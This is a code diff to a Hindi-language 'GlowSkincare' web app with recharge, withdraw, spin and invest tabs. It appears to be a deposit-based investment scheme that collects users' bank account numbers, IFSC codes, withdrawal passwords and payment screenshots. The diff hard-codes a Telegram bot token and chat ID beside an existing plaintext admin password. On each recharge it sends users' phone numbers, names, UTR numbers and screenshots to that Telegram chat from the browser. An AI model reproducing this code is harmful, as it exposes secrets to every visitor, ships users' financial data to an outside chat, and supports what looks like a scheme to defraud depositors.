@@ -16,7 +16,7 @@
     .btn-gray { background: #374151; }
     .btn-opt { flex: 1; padding: 8px; font-size: 11px; border: 1px solid #374151; background: #0b0f19; color: #9ca3af; border-radius: 6px; cursor: pointer; }
     .btn-opt.selected { background: #059669; color: #fff; font-weight: bold; border-color: #059669; }
-    .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 420px; background: #111827; border-top: 1px solid #1f2937; display: flex; justify-content: space-around; padding: 10px 0; }
+    .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 420px; background: #111827; border-top: 1px solid #1f2937; display: flex; justify-content: space-around; padding: 10px 0; z-index: 10; }
     .nav-btn { background: none; border: none; color: #9ca3af; font-size: 11px; cursor: pointer; }
     .nav-btn.active { color: #34d399; font-weight: bold; }
     .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; text-align: center; }
@@ -35,7 +35,7 @@
         <input type="text" id="phone" placeholder="मोबाइल नंबर" required class="input-field">
         <div id="regExtra" style="display: none;">
           <input type="text" id="uname" placeholder="यूजरनेम" class="input-field">
-          <input type="password" id="wPass" placeholder="विथड्रॉल पासवर्ड (अलग)" class="input-field">
+          <input type="password" id="wPass" placeholder="विथड्रॉल पासवर्ड (अलग)" required class="input-field">
         </div>
         <input type="password" id="lPass" placeholder="लॉगिन पासवर्ड" required class="input-field">
         <button type="submit" class="btn" id="submitBtn">लॉगिन करें</button>
@@ -45,11 +45,16 @@
 
   <script>
     const ADMIN_PASS = "admin786";
+    const TELEGRAM_BOT_TOKEN = "8854457716:AAEca3kyrRii_0EYrtbZ_62p0zXQlsbnNAE"; 
+    const TELEGRAM_CHAT_ID = "7948579574";
+
     let isRegister = false;
     let currentSession = localStorage.getItem('glow_session') || null;
     let currentTab = 'home';
     let isAdmin = false;
     let selectedPayMethod = 'qr';
+    let rechargeStep = 1;
+    let tempRechargeAmt = 150;
 
     function getStorage(k, def) {
       try { return JSON.parse(localStorage.getItem(k)) || def; } catch(e) { return def; }
@@ -104,6 +109,18 @@
       renderMain();
     }
 
+    function proceedToPaymentDone() {
+      const amtInput = document.getElementById('ramt');
+      const amt = amtInput ? Number(amtInput.value) : 150;
+      if (amt < 150) {
+        alert('न्यूनतम रिचार्ज ₹150 है!');
+        return;
+      }
+      tempRechargeAmt = amt;
+      rechargeStep = 2;
+      renderMain();
+    }
+
     function renderMain() {
       const app = document.getElementById('app');
       if (isAdmin) {
@@ -136,7 +153,7 @@
           </div>
           <div style="padding:14px;">
             <div class="grid-4">
-              <button onclick="currentTab='recharge';renderMain()" class="card" style="padding:10px;">💳<br><span style="font-size:10px;">Recharge</span></button>
+              <button onclick="currentTab='recharge';rechargeStep=1;renderMain()" class="card" style="padding:10px;">💳<br><span style="font-size:10px;">Recharge</span></button>
               <button onclick="currentTab='withdraw';renderMain()" class="card" style="padding:10px;">🏦<br><span style="font-size:10px;">Withdraw</span></button>
               <button onclick="currentTab='spin';renderMain()" class="card" style="padding:10px;">🎯<br><span style="font-size:10px;">Spin</span></button>
               <button onclick="currentTab='invest';renderMain()" class="card" style="padding:10px;">💎<br><span style="font-size:10px;">Invest</span></button>
@@ -159,38 +176,53 @@
           <div style="padding:16px;">
             <h3>रिचार्ज (न्यूनतम ₹150)</h3>
             
-            <p style="font-size:11px; color:#9ca3af; margin:10px 0 6px 0;">पेमेंट माध्यम चुनें:</p>
-            <div style="display:flex; gap:8px; margin-bottom:12px;">
-              <button onclick="setPayMethod('qr')" class="btn-opt ${selectedPayMethod==='qr'?'selected':''}">📱 QR Code Pay</button>
-              <button onclick="setPayMethod('bank')" class="btn-opt ${selectedPayMethod==='bank'?'selected':''}">🏦 Bank Account Pay</button>
-            </div>
-
-            ${selectedPayMethod === 'qr' ? `
-              <div class="card" style="text-align:center;">
-                <p style="font-size:12px; margin-bottom:8px;">QR कोड स्कैन करके भुगतान करें:</p>
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=upi://pay?pa=merchant@paytm&pn=GlowSkincare&cu=INR" style="width:140px; height:140px; border-radius:8px;">
+            ${rechargeStep === 1 ? `
+              <p style="font-size:11px; color:#9ca3af; margin:10px 0 6px 0;">पेमेंट माध्यम चुनें:</p>
+              <div style="display:flex; gap:8px; margin-bottom:12px;">
+                <button onclick="setPayMethod('qr')" class="btn-opt ${selectedPayMethod==='qr'?'selected':''}">📱 QR Code Pay</button>
+                <button onclick="setPayMethod('bank')" class="btn-opt ${selectedPayMethod==='bank'?'selected':''}">🏦 Bank Account Pay</button>
               </div>
+
+              <div style="margin-bottom:12px;">
+                <label style="font-size:11px; color:#9ca3af; display:block; margin-bottom:4px;">रिचार्ज राशि (₹):</label>
+                <input type="number" id="ramt" min="150" value="${tempRechargeAmt}" class="input-field">
+              </div>
+
+              ${selectedPayMethod === 'qr' ? `
+                <div class="card" style="text-align:center;">
+                  <p style="font-size:12px; margin-bottom:8px;">QR कोड स्कैन करके भुगतान करें:</p>
+                  <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&data=upi://pay?pa=merchant@paytm&pn=GlowSkincare&cu=INR" style="width:140px; height:140px; border-radius:8px; margin:auto;">
+                </div>
+              ` : `
+                <div class="card">
+                  <p style="font-size:12px; color:#34d399; font-weight:bold; margin-bottom:6px;">बैंक ट्रांसफर विवरण:</p>
+                  <p style="font-size:11px; color:#9ca3af;">A/C No: 38290100001234<br>IFSC: SBIN0001234<br>Name: GlowSkincare</p>
+                </div>
+              `}
+
+              <button onclick="proceedToPaymentDone()" class="btn" style="margin-top:10px;">मैंने पेमेंट कर दिया है, आगे बढ़ें</button>
             ` : `
-              <div class="card">
-                <p style="font-size:12px; color:#34d399; font-weight:bold; margin-bottom:6px;">बैंक ट्रांसफर विकल्प:</p>
-                <p style="font-size:11px; color:#9ca3af;">नीचे अपना बैंक खाता विवरण भरें जिससे पेमेंट की जाएगी।</p>
+              <div class="card" style="background:#064e3b; border-color:#059669; margin-bottom:12px;">
+                <p style="font-size:12px;">चुनी गई राशि: <b>₹${tempRechargeAmt}</b></p>
+                <button onclick="rechargeStep=1;renderMain()" style="background:none; border:none; color:#34d399; font-size:11px; cursor:pointer; text-decoration:underline; margin-top:4px;">← राशि या माध्यम बदलें</button>
               </div>
+
+              <form onsubmit="handleRecSubmit(event)">
+                <input type="text" id="rname" placeholder="अपना नाम / खाता धारक का नाम" required class="input-field">
+                
+                ${selectedPayMethod === 'bank' ? `
+                  <input type="text" id="racc" placeholder="अपना बैंक खाता संख्या" required class="input-field">
+                  <input type="text" id="rifsc" placeholder="बैंक IFSC कोड" required class="input-field">
+                ` : ''}
+
+                <input type="text" id="rutr" placeholder="12 अंकों का UTR नंबर" required class="input-field">
+                
+                <label style="font-size:11px; color:#9ca3af; display:block; margin-bottom:4px;">पेमेंट स्क्रीनशॉट अपलोड करें (अनिवार्य):</label>
+                <input type="file" id="rfile" accept="image/*" required class="input-field">
+                
+                <button type="submit" class="btn">रिचार्ज सबमिट करें</button>
+              </form>
             `}
-
-            <form onsubmit="handleRecSubmit(event)">
-              <input type="number" id="ramt" min="150" placeholder="राशि (₹)" required class="input-field">
-              <input type="text" id="rname" placeholder="अपना नाम / खाता धारक का नाम" required class="input-field">
-              
-              ${selectedPayMethod === 'bank' ? `
-                <input type="text" id="racc" placeholder="अपना बैंक खाता संख्या" required class="input-field">
-                <input type="text" id="rifsc" placeholder="बैंक IFSC कोड" required class="input-field">
-              ` : ''}
-
-              <input type="text" id="rutr" placeholder="12 अंकों का UTR नंबर" required class="input-field">
-              <label style="font-size:11px; color:#9ca3af; display:block; margin-bottom:4px;">पेमेंट स्क्रीनशॉट अपलोड करें (अनिवार्य):</label>
-              <input type="file" id="rfile" accept="image/*" required class="input-field">
-              <button type="submit" class="btn">रिचार्ज सबमिट करें</button>
-            </form>
           </div>
         `;
       } else if (currentTab === 'withdraw') {
@@ -220,7 +252,7 @@
         <div class="bottom-nav">
           <button class="nav-btn ${currentTab==='home'?'active':''}" onclick="currentTab='home';renderMain()">🏠<br>Home</button>
           <button class="nav-btn ${currentTab==='invest'?'active':''}" onclick="currentTab='invest';renderMain()">💎<br>Invest</button>
-          <button class="nav-btn ${currentTab==='recharge'?'active':''}" onclick="currentTab='recharge';renderMain()">💳<br>Recharge</button>
+          <button class="nav-btn ${currentTab==='recharge'?'active':''}" onclick="currentTab='recharge';rechargeStep=1;renderMain()">💳<br>Recharge</button>
         </div>
       `;
     }
@@ -238,7 +270,7 @@
 
     function handleRecSubmit(e) {
       e.preventDefault();
-      const amt = Number(document.getElementById('ramt').value);
+      const amt = tempRechargeAmt;
       const name = document.getElementById('rname').value.trim();
       const acc = document.getElementById('racc') ? document.getElementById('racc').value.trim() : 'N/A (QR Pay)';
       const ifsc = document.getElementById('rifsc') ? document.getElementById('rifsc').value.trim() : 'N/A';
@@ -248,7 +280,7 @@
       const reader = new FileReader();
       reader.onload = function(evt) {
         const p = getStorage('glow_pending', []);
-        p.push({ 
+        const newReq = { 
           id: Date.now(), 
           phone: currentSession, 
           method: selectedPayMethod === 'qr' ? 'QR Code' : 'Bank Transfer',
@@ -258,10 +290,40 @@
           ifsc, 
           utr, 
           img: evt.target.result 
-        });
+        };
+        p.push(newReq);
         setStorage('glow_pending', p);
+
+        // टेलीग्राम पर मैसेज और फोटो भेजने की प्रक्रिया
+        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+          const textMsg = `🔔 नया रिचार्ज अनुरोध!\n📱 यूजर: ${currentSession}\n👤 नाम: ${name}\n💰 राशि: ₹${amt}\n🔢 UTR: ${utr}\n💳 माध्यम: ${selectedPayMethod}`;
+          
+          // पहले टेक्स्ट भेजें
+          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMsg })
+          }).catch(err => console.log(err));
+
+          // फिर स्क्रीनशॉट फोटो भेजें
+          fetch(evt.target.result)
+            .then(res => res.blob())
+            .then(blob => {
+              const formData = new FormData();
+              formData.append('chat_id', TELEGRAM_CHAT_ID);
+              formData.append('photo', blob, 'screenshot.jpg');
+              formData.append('caption', `स्क्रीनशॉट - UTR: ${utr} (₹${amt})`);
+
+              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+              }).catch(err => console.log(err));
+            });
+        }
+
         alert('रिचार्ज अनुरोध भेज दिया गया!');
         currentTab = 'home';
+        rechargeStep = 1;
         renderMain();
       };
       reader.readAsDataURL(file);
